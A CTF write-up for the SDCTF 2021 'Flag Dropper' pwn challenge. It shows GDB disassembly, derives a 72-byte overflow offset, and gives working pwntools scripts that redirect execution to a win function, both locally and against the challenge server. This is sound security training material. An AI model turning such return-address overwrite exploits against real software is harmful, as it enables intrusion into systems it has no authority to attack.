---
layout: load_md
title: The White Circle | Sdctf 2021 | Flag Dropper Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Sdctf 2021
parent: sdctf_2021
category: pwn
challenge: Flag Dropper
tags: "pwn, twh"
date: 2021-05-10T00:00:00+00:00
last_modified_at: 2021-05-10T00:00:00+00:00
---

<h1 class="heading card-title white-text">Sdctf 2021</h1>

## Flag Dropper
> Solved by Taz and thewhiteh4t

* After loading the binary in `GDB` we can list the functions
```
info functions
```

![](https://i.imgur.com/rbChpV2.png)

* here we can see that we have a `win` function
* win function disassembled :

```bash
gdb-peda$ disas win
Dump of assembler code for function win:
   0x00000000004005da <+0>:	mov    eax,0x0
   0x00000000004005df <+5>:	lea    rsi,ds:0x60109d
   0x00000000004005e7 <+13>:	lea    rdi,ds:0x601094
   0x00000000004005ef <+21>:	call   0x400440 <fopen@plt>
   0x00000000004005f4 <+26>:	mov    rdx,rax
   0x00000000004005f7 <+29>:	mov    eax,0x0
   0x00000000004005fc <+34>:	movabs rdi,0x601124
   0x0000000000400606 <+44>:	mov    esi,0x16
   0x000000000040060b <+49>:	call   0x400430 <fgets@plt>
   0x0000000000400610 <+54>:	mov    edi,0x1
   0x0000000000400615 <+59>:	mov    eax,0x1
   0x000000000040061a <+64>:	mov    edx,0x16
   0x000000000040061f <+69>:	syscall
   0x0000000000400621 <+71>:	jmp    0x4005d0 <_exit>
   0x0000000000400623 <+73>:	nop    WORD PTR cs:[rax+rax*1+0x0]
   0x000000000040062d <+83>:	nop    DWORD PTR [rax]
End of assembler dump.
```

* it is opening and reading some file
* now lets run the binary in GDB with a breakpoint in main

![](https://i.imgur.com/MMVX7lC.png)

* after some instructions we can see **flag.txt**
* I created a file named **flag.txt** with a fake flag inside it
* now I tried to execute the `win` function I found earlier

![](https://i.imgur.com/Zb62G51.png)

* great so win function is opening **flag.txt** and printing the flag
* now I looked for something which can execute the win function

![](https://i.imgur.com/0yJjSWN.png)

* we can see in the `code` section :

```
<main+142>: jmp QWORD PTR [rax]
```

* `jmp` is used for changing the flow of the programing , that means if we can provide the start address of `win` function to `jmp` it will execute it for us

* I found the offset at `73`

![](https://i.imgur.com/bovjmMe.png)

* Now lets find the start address of `win` function

```
gdb-peda$ print win
$1 = {<text variable, no debug info>} 0x4005da <win>
```

* Testing the offset in GDB :

```bash
python -c "print('A' * 73 + 'BBBBBBBB')"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```

![](https://i.imgur.com/6hrG88c.png)

* we have a small problem here, it seems like one of the A is extra so the offset should be 72 instead of 73

* Testing the new offset using pwntools with start address of `win` function :

```python
#!usr/bin/env python3

from pwn import *

offset = 72
addr = 0x4005da # Start address of win function

junk = b'A' * 72
le_num = p64(addr) # converted to little endian
buffer = junk + le_num 

elf = ELF('./flagDropper')
p = elf.process()
p.send(buffer)
out = p.recvall()
print(out)

```

* the script above runs the binary locally and sends our payload, here is the output :

![](https://i.imgur.com/fc0v22d.png)

* It works!, now I created a new script to send the payload on the server

```python
#!/usr/bin/env python3
    
from pwn import *
    
host = 'dropper.sdc.tf'
port = 1337
offset = 72
addr = 0x4005da # address of win function
    
junk = b'A' * offset
le_num = p64(addr)
    
buffer = junk + le_num
conn = remote(host, port)
conn.send(buffer)
flag = conn.recvuntil('}').decode()
print(f'\nFLAG : {flag}\n')
conn.close()
```

**OUTPUT :**

![](https://i.imgur.com/pu5NYoX.png)

